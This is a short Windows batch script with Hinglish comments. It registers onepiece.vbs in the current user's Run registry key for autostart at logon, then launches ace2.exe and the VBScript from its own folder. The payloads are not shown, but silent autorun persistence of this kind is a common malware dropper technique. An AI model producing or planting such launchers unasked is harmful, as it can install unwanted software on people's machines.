@echo off
REM Registry entry banane ka code jo onepiece.vbs ko startup me register karega
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OnePiece /t REG_SZ /d "wscript.exe %~dp0onepiece.vbs" /f

REM ace2.exe ko run karne ka code
start %~dp0ace2.exe

REM Agar onepiece.vbs file ko execute bhi karana hai
wscript.exe %~dp0onepiece.vbs
